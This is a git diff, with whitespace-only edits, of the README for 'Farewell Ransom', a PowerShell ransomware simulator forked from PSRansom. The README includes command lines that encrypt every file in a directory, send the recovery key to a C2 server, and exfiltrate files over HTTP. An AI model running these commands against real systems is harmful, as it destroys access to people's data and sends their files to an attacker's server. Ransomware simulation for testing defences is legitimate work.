@@ -1,7 +1,7 @@
 <p align="center"><img width=750 alt="Farewell Ransom" src="https://github.com/BZHack/Farewell-Ransom/blob/main/Demo/RUCyberArmy.jpg"></p>
 
 # Farewell Ransom
-**Farewell Ransom** is a PowerShell Ransomware Simulator with C2 Server capabilities. This tool helps you simulate encryption process of a generic ransomware in any system on any system with PowerShell installed on it. Thanks to the integrated C2 server, you can exfiltrate files and receive client information via HTTP. 
+**Farewell Ransom** is a PowerShell Ransomware Simulator with C2 Server capabilities. This tool helps you simulate encryption process of a generic ransomware in any system on any system with PowerShell installed on it. Thanks to the integrated C2 server, you can exfiltrate files and receive client information via HTTP.
 
 It's a fork of the great work of JoelGMSec https://github.com/JoelGMSec/PSRansom
 
@@ -9,7 +9,6 @@ All communication between the two elements is encrypted or encoded so as to be u
 
 # Requirements
 - PowerShell 4.0 or greater
-
 
 # Download
 It is recommended to clone the complete repository or download the zip file.
@@ -26,7 +25,7 @@ git clone https://github.com/BZHack/Farewell-Ransom
    ##################
    ##################
    ##################
-                                                              
+
    "  ----------------- by @RUCyberArmy ----------------  "
 
  Info:  This tool helps you simulate encryption process of a
@@ -39,7 +38,7 @@ git clone https://github.com/BZHack/Farewell-Ransom
         .\frsm.ps1 -d Directory -k RecoveryKey
           Decrypt all files with recovery key string
 
- Usage safe: 
+ Usage safe:
          .\frsm.ps1 -se Directory -s C2Server -p C2Port
           Encrypt all files & sends recovery key to C2Server & Hide the original files
           Use -x to exfiltrate and decrypt files on C2Server
